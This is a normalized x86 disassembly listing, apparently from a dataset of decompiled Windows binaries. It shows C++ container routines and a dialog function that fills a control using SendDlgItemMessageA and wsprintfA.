push ecx
sar edx 0x2
sub ebx edx
push esi
lea edx [ ebp + 0x10 ]
push edx
push ebx
push eax
mov [ ebp - 0x4 ] 0x2
call sub_420d80
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
add edx eax
mov [ esi + 0x8 ] edx
mov esi edx
sub esi eax
add esp 0x14
cmp edi esi
je r-xdata
add eax edx
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax + edi ]
cmp edi ecx
mov eax edi
je r-xdata
mov ecx [ ebp + 0xc ]
sub ecx eax
lea esp [ esp ]
mov edx [ esi + 0x8 ]
sub edx ecx
sar edx 0x2
xor edx edx
jmp r-xdata
test ecx ecx
jne r-xdata
lea esp [ esp ]
mov edx [ eax - 0x4 ]
sub eax 0x4
cmp eax edi
mov [ ecx + eax ] edx
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ edi ] eax
add edi 0x4
cmp edi esi
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
shl eax 0x2
push eax
mov [ ebp - 0x14 ] eax
call sub_4b573e
mov edx [ ebp + 0x8 ]
add esp 0x4
push eax
push ecx
mov [ ebp + 0xc ] eax
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov [ eax ] edx
mov ecx [ esi + 0x4 ]
mov eax esp
mov [ eax ] ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x18 ] esp
call sub_4162b0
mov edx [ ebp + 0x8 ]
push edx
mov edi eax
push esi
lea eax [ ebp + 0x10 ]
push eax
push ebx
push edi
call sub_420d80
mov edx [ ebp + 0x8 ]
add esp 0x14
lea eax [ edi + ebx * 4 ]
push eax
push ecx
mov ecx [ esi + 0x8 ]
mov eax esp
mov [ ebp + 0x10 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
mov ecx esi
mov [ ebp + 0x10 ] esp
mov [ eax ] edx
call sub_4162b0
mov ecx [ esi + 0x4 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
add edx ebx
cmp eax edx
jae r-xdata
mov edx [ ebp + 0x10 ]
mov [ eax ] edx
add eax 0x4
cmp eax ecx
jne r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x14 ]
add ecx eax
lea edx [ eax + ebx * 4 ]
mov [ esi + 0xc ] ecx
mov [ esi + 0x8 ] edx
mov [ esi + 0x4 ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push ecx
call j_sub_4b66ed#2
add esp 0x4
add ebx eax
test ecx ecx
je r-xdata
add eax ebx
sub_418320
push ebx
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
mov eax 0x66666667
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
mov ebx edx
xor ebx ebx
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esi + 0x8 ]
push ecx
push ecx
mov eax esp
mov [ eax ] edx
lea eax [ esp + 0x18 ]
push eax
mov ecx esi
call sub_418490
pop edi
pop esi
pop ebx
retn 0x4
mov ecx [ esi + 0xc ]
sub ecx edi
mov eax 0x66666667
imul ecx
sar edx 0x3
mov ecx edx
shr ecx 0x1f
add edx ecx
cmp ebx edx
jae r-xdata
test edi edi
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov edi [ esi + 0x8 ]
push edx
push esi
push eax
push 0x1
push edi
call sub_4183b0
add esp 0x14
add edi 0x14
mov [ esi + 0x8 ] edi
pop edi
pop esi
pop ebx
retn 0x4
sub_4183b0
push ebp
mov ebp esp
push 0xffffffff
push sub_4bf8c1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp + 0xc ] esi
test esi esi
mov [ ebp - 0x4 ] 0x1
je r-xdata
dec edi
add esi 0x14
mov [ ebp - 0x4 ] 0x0
mov [ ebp + 0x8 ] esi
jmp r-xdata
mov eax [ ebx ]
lea ecx [ ebx + 0x4 ]
push ecx
lea ecx [ esi + 0x4 ]
mov [ esi ] eax
call sub_40dcd0
test edi edi
jbe r-xdata
sub_418414
mov ebx [ ebp - 0x14 ]
cmp ebx [ ebp + 0x8 ]
je r-xdata
push 0x0
push 0x0
call sub_4b5bd2
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
lea esi [ ebx + 0x8 ]
nop
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x8 ]
add ebx 0x14
add esi 0x14
cmp ebx eax
jne r-xdata
lea edx [ ebp + 0x8 ]
push edx
lea eax [ ebp + 0x8 ]
push eax
call sub_4011d0
mov [ ebp + 0xc ] al
mov ecx [ ebp + 0xc ]
mov eax [ esi + 0x4 ]
push ecx
lea edx [ esi - 0x4 ]
push edx
push eax
push edi
call sub_402270
mov eax [ esi ]
push eax
call j_sub_4b66ed#2
add esp 0x1c
mov edi [ esi ]
test edi edi
je r-xdata
sub_418490
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
xor edi edi
jmp r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
mov eax 0x66666667
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x14 ] edx
jne r-xdata
mov edx [ esp + 0x18 ]
push edx
push 0x1
push ecx
mov eax esp
mov ecx esi
mov [ eax ] ebx
call sub_418500
mov ecx [ esi + 0x4 ]
lea eax [ edi + edi * 4 ]
pop edi
lea edx [ ecx + eax * 4 ]
mov eax [ esp + 0xc ]
pop esi
mov [ eax ] edx
pop ebx
retn 0xc
mov ecx ebx
sub ecx edi
mov eax 0x66666667
imul ecx
sar edx 0x3
mov ecx edx
shr ecx 0x1f
add edx ecx
mov edi edx
sub_418500
push ebp
mov ebp esp
push 0xffffffff
push sub_4bf8d8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
mov eax [ ebp + 0x10 ]
push ebx
push esi
mov esi ecx
mov ecx [ eax ]
push edi
add eax 0x4
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x2c ] ecx
push eax
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x14 ] esi
call sub_40dcd0
mov edi [ esi + 0x4 ]
xor ecx ecx
cmp edi ecx
mov [ ebp - 0x4 ] ecx
je r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
mov ecx [ esi + 0xc ]
sub ecx edi
mov eax 0x66666667
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
mov ecx edx
mov esi [ ebp - 0x24 ]
test esi esi
je r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp + 0x8 ]
mov ecx [ ebp - 0x20 ]
push edx
lea eax [ ebp - 0x28 ]
push eax
push ecx
push esi
call sub_402270
push esi
call j_sub_4b66ed#2
add esp 0x14
mov edx [ esi + 0x8 ]
sub edx edi
mov eax 0x66666667
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
test edi edi
jne r-xdata
mov ecx esi
call sub_40bf80
mov eax 0xccccccc
sub eax edx
cmp eax ebx
jae r-xdata
mov edx [ esi + 0x8 ]
sub edx edi
mov eax 0x66666667
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov edi [ ebp + 0x8 ]
mov edx ecx
sub edx edi
mov eax 0x66666667
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
cmp edx ebx
mov [ ebp + 0x10 ] ecx
jae r-xdata
mov eax ecx
shr eax 0x1
mov edx 0xccccccc
sub edx eax
cmp edx ecx
jae r-xdata
add edx ebx
cmp ecx edx
jae r-xdata
push ecx
push ecx
mov eax esp
mov [ ebp + 0x8 ] esp
push ecx
mov [ eax ] ecx
lea ebx [ ebx + ebx * 4 ]
shl ebx 0x2
sub ecx ebx
mov eax esp
mov [ ebp + 0x8 ] esp
mov [ ebp + 0x8 ] ecx
mov [ eax ] ecx
mov ecx esi
call sub_4188b0
mov edx [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
push ecx
mov ecx [ ebp + 0x10 ]
mov eax esp
mov [ ebp + 0xc ] esp
mov [ eax ] ecx
push ecx
mov eax esp
mov [ ebp + 0xc ] esp
push ecx
mov [ eax ] edx
mov eax esp
mov [ eax ] edi
lea eax [ ebp + 0x10 ]
mov [ ebp + 0x8 ] esp
push eax
call sub_418880
add ebx edi
add esp 0x10
cmp edi ebx
je r-xdata
lea eax [ ebx + ebx * 4 ]
shl eax 0x2
mov [ ebp + 0x10 ] eax
add eax edi
push eax
push ecx
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
mov ecx esi
mov [ ebp - 0x18 ] esp
mov [ eax ] edi
call sub_4188b0
mov ecx [ esi + 0x8 ]
mov edx ecx
sub edx edi
mov eax 0x66666667
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
sub ebx edx
mov edx [ ebp + 0x8 ]
push edx
push esi
lea eax [ ebp - 0x2c ]
push eax
push ebx
push ecx
mov [ ebp - 0x4 ] 0x3
call sub_4183b0
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0x10 ]
add edx eax
mov [ esi + 0x8 ] edx
mov esi edx
sub esi eax
add esp 0x14
cmp edi esi
mov [ ebp - 0x4 ] 0x0
je r-xdata
add ecx eax
xor ecx ecx
jmp r-xdata
lea esp [ esp ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx edi
call sub_40e000
add edi 0x14
cmp edi esi
jne r-xdata
mov edx [ esi + 0x8 ]
sub edx edi
mov eax 0x66666667
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
test edi edi
jne r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx edi
call sub_40e000
add edi 0x14
cmp edi ebx
jne r-xdata
jmp r-xdata
lea edi [ ecx + ecx * 4 ]
shl edi 0x2
push edi
call sub_4b573e
add esp 0x4
push eax
push ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp + 0x10 ] eax
mov [ ebp + 0xc ] eax
mov eax esp
mov [ ebp - 0x18 ] esp
mov [ eax ] ecx
mov edx [ esi + 0x4 ]
push ecx
mov eax esp
mov ecx esi
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x18 ] esp
mov [ eax ] edx
call sub_4188b0
mov ecx [ ebp + 0x8 ]
push ecx
push esi
lea edx [ ebp - 0x2c ]
push edx
push ebx
push eax
mov [ ebp + 0xc ] eax
call sub_4183b0
mov ecx [ ebp + 0xc ]
mov edx [ esi + 0x8 ]
add esp 0x14
lea eax [ ebx + ebx * 4 ]
lea eax [ ecx + eax * 4 ]
push eax
push ecx
mov [ ebp + 0xc ] eax
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] edx
mov eax esp
mov [ eax ] ecx
mov ecx esi
mov [ ebp - 0x18 ] esp
call sub_4188b0
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov ecx esi
call sub_40af40
mov ecx eax
add ecx ebx
add edx ebx
cmp ecx edx
jae r-xdata
mov ecx [ esi + 0x8 ]
sub ecx eax
mov eax 0x66666667
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov eax [ ebp + 0x10 ]
lea ecx [ ebx + ebx * 4 ]
add edi eax
lea edx [ eax + ecx * 4 ]
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] edx
mov [ esi + 0x4 ] eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
push ecx
push eax
mov ecx esi
call sub_413a60
mov edx [ esi + 0x4 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esi + 0x4 ]
add ebx edx
test eax eax
je r-xdata
sub_418880
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0x14 ]
cmp ebx esi
push edi
mov edi [ esp + 0x1c ]
je r-xdata
mov eax [ esp + 0x10 ]
mov [ eax ] edi
pop edi
pop esi
pop ebx
retn
sub edi 0x14
sub esi 0x14
push esi
mov ecx edi
call sub_40e000
cmp esi ebx
jne r-xdata
sub_4188b0
mov eax [ esp + 0xc ]
mov edx [ esp + 0x4 ]
push ecx
push eax
push ecx
mov ecx [ esp + 0x14 ]
mov eax esp
mov [ eax ] ecx
push ecx
mov eax esp
mov [ eax ] edx
call sub_4188e0
add esp 0x10
retn 0xc
sub_4188e0
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push eax
push ecx
push edx
mov edx [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x18 ]
mov eax esp
mov [ eax ] ecx
push ecx
mov eax esp
mov [ eax ] edx
call sub_418910
add esp 0x14
retn
sub_418910
push ebp
mov ebp esp
push 0xffffffff
push sub_4befd1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp + 0xc ] esi
test esi esi
mov [ ebp - 0x4 ] 0x1
je r-xdata
add esi 0x14
mov [ ebp - 0x4 ] 0x0
mov [ ebp + 0x10 ] esi
add edi 0x14
jmp r-xdata
mov eax [ edi ]
lea ecx [ edi + 0x4 ]
push ecx
lea ecx [ esi + 0x4 ]
mov [ esi ] eax
call sub_40dcd0
cmp edi ebx
je r-xdata
sub_418976
mov ebx [ ebp - 0x14 ]
cmp ebx [ ebp + 0x10 ]
je r-xdata
push 0x0
push 0x0
call sub_4b5bd2
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
lea esi [ ebx + 0x8 ]
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
add ebx 0x14
add esi 0x14
cmp ebx eax
jne r-xdata
lea edx [ ebp + 0x10 ]
push edx
lea eax [ ebp + 0x10 ]
push eax
call sub_4011d0
mov [ ebp + 0xc ] al
mov ecx [ ebp + 0xc ]
mov eax [ esi + 0x4 ]
push ecx
lea edx [ esi - 0x4 ]
push edx
push eax
push edi
call sub_402270
mov eax [ esi ]
push eax
call j_sub_4b66ed#2
add esp 0x1c
mov edi [ esi ]
test edi edi
je r-xdata
sub_4189f0
push 0xffffffff
mov eax [ fs : 0x0 ]
push sub_4bf953
push eax
mov eax 0x10290
mov [ fs : 0x0 ] esp
call sub_4b6180
push ebx
push ebp
push esi
push edi
lea ecx [ esp + 0x278 ]
call sub_44fb50
mov eax [ esp + 0x102b0 ]
xor ebp ebp
push eax
lea ecx [ esp + 0x27c ]
mov [ esp + 0x102ac ] ebp
call sub_44f660
mov ecx [ esp + 0x102b4 ]
call sub_414f80
mov [ esp + 0x58 ] 0xf
mov [ esp + 0x54 ] ebp
mov [ esp + 0x44 ] 0x0
or esi 0xffffffff
lea ecx [ esp + 0x278 ]
mov [ esp + 0x102a8 ] 0x1
mov [ esp + 0x1c ] esi
call sub_450270
test eax eax
jne r-xdata
lea ecx [ esp + 0x278 ]
call sub_450380
cmp eax 0x7
mov ecx [ esp + 0x27c ]
jne r-xdata
mov ecx [ rw-data ]
cmp ecx ebp
je r-xdata
cmp esi ecx
je r-xdata
mov [ esp + 0x1c ] ecx
jmp r-xdata
push r--data
cmp [ esp + 0x54 ] ebp
jbe r-xdata
cmp eax 0x2
jne r-xdata
or esi 0xffffffff
mov [ esp + 0x1c ] esi
lea ecx [ esp + 0x278 ]
call sub_450270
test eax eax
jne r-xdata
lea ecx [ esp + 0x278 ]
mov [ esp + 0x58 ] 0xf
mov [ esp + 0x54 ] ebp
mov [ esp + 0x44 ] 0x0
mov [ esp + 0x102a8 ] 0xffffffff
call sub_44f5f0
mov eax 0x1
mov eax [ esp + 0x44 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp [ esp + 0x58 ] 0x10
mov eax [ esp + 0x44 ]
jae r-xdata
cmp eax 0x13
jne r-xdata
mov [ esp + 0x38 ] 0xf
mov [ esp + 0x34 ] ebp
mov [ esp + 0x24 ] 0x0
lea ecx [ esp + 0x278 ]
mov [ esp + 0x102a8 ] al
call sub_44fb10
mov ecx eax
lea esi [ ecx + 0x1 ]
mov edi edi
mov esi [ esp + 0x1c ]
lea esp [ esp ]
jmp r-xdata
push eax
jmp r-xdata
lea eax [ esp + 0x44 ]
cmp esi 0xffffffff
je r-xdata
mov [ esp + 0x1c ] 0xffffffff
jmp r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
push ecx
push eax
lea ecx [ esp + 0x28 ]
call sub_401e80
lea ecx [ esp + 0xd8 ]
mov [ esp + 0x13 ] 0x0
call sub_413b80
mov ebx [ rw-data ]
lea edi [ ebx + 0x14 ]
mov [ esp + 0x102a8 ] 0x3
mov [ esp + 0x18 ] ebp
mov [ esp + 0x14 ] edi
push ebp
push 0xc
push 0x3f3
push ecx
call [ SendDlgItemMessageA@IAT ]
cmp [ esp + 0x58 ] 0x10
jb r-xdata
push ecx
lea eax [ esp + 0x17c ]
push r--data
push eax
call [ wsprintfA@IAT ]
lea eax [ esp + 0x184 ]
add esp 0xc
lea edx [ eax + 0x1 ]
jmp r-xdata
mov ecx esi
sub ecx ebx
mov eax 0x66666667
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
cmp ebx ebp
jne r-xdata
cmp [ edi + 0x14 ] 0x10
mov ebp [ edi + 0x10 ]
jb r-xdata
cmp [ esp + 0x18 ] edx
jge r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x17c ]
push ecx
lea ecx [ esp + 0x48 ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
sub esi ebx
mov ecx esi
mov eax 0x66666667
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov edi [ esp + 0x14 ]
mov ecx [ esp + 0x14 ]
mov edi [ ecx ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x48 ]
call sub_401cc0
mov esi 0x10
cmp [ esp + 0x1c ] 0xffffffff
jne r-xdata
cmp [ esp + 0x18 ] edx
jne r-xdata
cmp edx ebp
jb r-xdata
cmp edx ebp
mov ecx edx
jb r-xdata
mov edx [ esp + 0x34 ]
test edx edx
je r-xdata
cmp [ esp + 0x58 ] 0x10
jb r-xdata
cmp [ esp + 0x58 ] 0x10
mov eax [ esp + 0x44 ]
jae r-xdata
lea ecx [ esp + 0x278 ]
call sub_450380
mov edi [ esp + 0x10284 ]
mov eax 0x1
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] eax
mov [ esp + 0x3c ] 0x0
mov eax [ esp + 0x1c ]
cmp eax 0xffffffff
je r-xdata
mov esi 0x10
mov [ esp + 0x13 ] 0x1
jmp r-xdata
mov ecx [ esp + 0x27c ]
push ecx
lea edx [ esp + 0x17c ]
push r--data
push edx
call [ wsprintfA@IAT ]
lea eax [ esp + 0x184 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
add eax 0xa0
inc ecx
mov [ esp + 0x18 ] ecx
mov [ esp + 0x14 ] eax
xor ebp ebp
mov edi eax
jmp r-xdata
xor eax eax
cmp edx ebp
setne al
test eax eax
je r-xdata
cmp [ esp + 0x38 ] 0x10
mov esi [ esp + 0x24 ]
jae r-xdata
mov ecx ebp
lea ecx [ esp + 0x278 ]
mov [ esp + 0x58 ] 0xf
mov [ esp + 0x54 ] 0x0
mov [ esp + 0x44 ] 0x0
mov [ esp + 0x102a8 ] 0xffffffff
call sub_44f5f0
xor eax eax
jmp r-xdata
mov edx [ esp + 0x44 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
push eax
push 0x0
push 0xc
push 0x3f3
push ecx
call [ SendDlgItemMessageA@IAT ]
lea eax [ esp + 0x44 ]
mov esi [ esp + 0x10284 ]
lea ecx [ esp + 0x278 ]
call sub_450380
mov ebx eax
test ebx ebx
mov [ esp + 0x14 ] ebx
je r-xdata
cmp eax [ esp + 0x27c ]
jne r-xdata
mov edx [ esp + 0x27c ]
push edx
lea eax [ esp + 0x17c ]
push r--data
push eax
call [ wsprintfA@IAT ]
lea eax [ esp + 0x184 ]
add esp 0xc
lea edx [ eax + 0x1 ]
cmp eax [ esp + 0x27c ]
mov [ esp + 0x102a8 ] 0x2
lea ecx [ esp + 0xd8 ]
je r-xdata
lea ecx [ esp + 0x278 ]
call sub_450270
cmp eax 0x19
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ esp + 0x17c ]
push eax
lea ecx [ esp + 0x48 ]
call sub_401cc0
push r--data
lea ecx [ esp + 0x24 ]
push ecx
lea edx [ esp + 0xc4 ]
push edx
call sub_402140
add esp 0xc
push 0xffffffff
push ebp
push eax
lea ecx [ esp + 0x4c ]
mov [ esp + 0x102b4 ] 0x4
call sub_4018c0
mov eax [ esp + 0xd4 ]
mov esi 0x10
cmp eax esi
mov [ esp + 0x102a8 ] 0x3
jb r-xdata
cmp ebx ebp
mov esi [ rw-data ]
jne r-xdata
mov eax [ esp + 0x18 ]
lea eax [ eax + eax * 4 ]
shl eax 0x5
add eax ebx
push eax
lea ecx [ esp + 0xdc ]
call sub_414c30
mov ebx [ rw-data ]
mov esi [ rw-data ]
xor ebp ebp
xor eax eax
[ esi ] [ edi ]
je r-xdata
lea esi [ esp + 0x24 ]
mov ecx [ esp + 0x102a0 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x1029c
retn
cmp [ esp + 0x1c ] 0xffffffff
je r-xdata
cmp ebx 0x1
je r-xdata
mov al [ esp + 0x13 ]
test al al
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x17c ]
push ecx
lea ecx [ esp + 0x48 ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
call sub_413c10
cmp [ esp + 0x38 ] esi
mov [ esp + 0x102a8 ] 0x1
jb r-xdata
call sub_413c10
cmp [ esp + 0x38 ] esi
mov [ esp + 0x102a8 ] 0x1
jb r-xdata
mov [ esp + 0xd4 ] 0xf
mov [ esp + 0xd0 ] ebp
mov [ esp + 0xc0 ] 0x0
mov [ esp + 0x13 ] 0x1
jmp r-xdata
mov eax [ esp + 0xc0 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
test eax eax
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
mov edx [ esp + 0x27c ]
push edx
lea eax [ esp + 0x17c ]
push r--data
push eax
call [ wsprintfA@IAT ]
lea eax [ esp + 0x184 ]
add esp 0xc
lea edx [ eax + 0x1 ]
cmp ebx 0x2
jne r-xdata
lea ecx [ esp + 0xd8 ]
mov [ esp + 0x102a8 ] 0x2
call sub_413c10
cmp [ esp + 0x38 ] 0x10
mov [ esp + 0x102a8 ] 0x1
jb r-xdata
mov edx [ esp + 0x27c ]
cmp [ esp + 0x1c ] edx
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x48 ]
call sub_401cc0
lea ecx [ esp + 0xd8 ]
mov [ esp + 0x102a8 ] 0x2
call sub_413c10
cmp [ esp + 0x38 ] esi
jmp r-xdata
mov [ esp + 0x38 ] 0xf
mov [ esp + 0x34 ] ebp
mov [ esp + 0x24 ] 0x0
jmp r-xdata
mov edx [ esp + 0x24 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esp + 0x24 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov [ esp + 0x38 ] 0xf
mov [ esp + 0x34 ] ebp
mov [ esp + 0x24 ] 0x0
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x17c ]
push ecx
lea ecx [ esp + 0x48 ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
cmp ebx 0x15
jne r-xdata
mov al [ esp + 0x13 ]
test al al
jne r-xdata
mov [ esp + 0x38 ] 0xf
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x24 ] 0x0
xor ebp ebp
jmp r-xdata
mov ecx [ esp + 0x24 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esp + 0x102b4 ]
lea eax [ esp + 0xd8 ]
push eax
call sub_416dc0
mov [ esp + 0xdc ] 0x1
jb r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x48 ]
call sub_401cc0
lea ecx [ esp + 0xd8 ]
mov [ esp + 0x102a8 ] 0x2
call sub_413c10
cmp [ esp + 0x38 ] 0x10
cmp ebx 0x19
jne r-xdata
lea ecx [ esp + 0x278 ]
call sub_450270
cmp eax 0x2
jne r-xdata
mov eax [ esp + 0x1c ]
cmp eax 0xffffffff
je r-xdata
lea ecx [ esp + 0x278 ]
call sub_44fb10
mov ecx eax
mov [ esp + 0x74 ] 0xf
mov [ esp + 0x70 ] 0x0
mov [ esp + 0x60 ] 0x0
lea esi [ ecx + 0x1 ]
lea ecx [ ecx ]
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov edx [ esp + 0x24 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
jmp r-xdata
cmp ebx 0x14
je r-xdata
inc [ esp + 0x18 ]
jmp r-xdata
inc [ esp + 0x3c ]
jmp r-xdata
lea ecx [ esp + 0x278 ]
call sub_450380
jmp r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
push ecx
push eax
lea ecx [ esp + 0x64 ]
call sub_401e80
mov eax [ esp + 0x108 ]
mov [ esp + 0x102a8 ] 0x5
mov [ esp + 0x14 ] 0x1
lea ebx [ eax + 0x20 ]
mov edi edi
cmp esi edi
jbe r-xdata
cmp ebx 0x1a
je r-xdata
mov ecx [ esp + 0x10c ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov edi [ esp + 0x10284 ]
inc ebp
cmp ebx 0x1a
je r-xdata
mov al [ esp + 0x13 ]
test al al
jne r-xdata
mov eax [ esp + 0x18 ]
dec eax
test eax eax
mov [ esp + 0x18 ] eax
jg r-xdata
mov eax [ esp + 0x108 ]
test eax eax
jne r-xdata
cmp [ ebx + 0x14 ] 0x10
mov ebp [ ebx + 0x10 ]
jb r-xdata
cmp [ esp + 0x14 ] edx
jge r-xdata
mov eax [ esp + 0x148 ]
test eax eax
jne r-xdata
mov [ esp + 0xac ] 0xf
mov [ esp + 0xa8 ] 0x0
mov [ esp + 0x98 ] 0x0
sub esi edi
push esi
push edi
lea ecx [ esp + 0x9c ]
mov [ esp + 0x102b0 ] 0x6
call sub_401e80
mov eax [ esp + 0x118 ]
cmp [ eax + ebp * 2 ] 0x73
jne r-xdata
mov ecx [ esp + 0x10c ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov edi ebx
mov edi [ ebx ]
jmp r-xdata
mov ecx [ esp + 0x14c ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov edx [ esp + 0x148 ]
mov ecx ebp
imul ecx ecx 0x1c
push 0xffffffff
add ecx edx
push 0x0
lea edx [ esp + 0x9c ]
push edx
call sub_401dd0
cmp [ esp + 0xac ] 0x10
mov [ esp + 0x102a8 ] 0x3
jb r-xdata
mov [ esp + 0x90 ] 0xf
mov [ esp + 0x8c ] 0x0
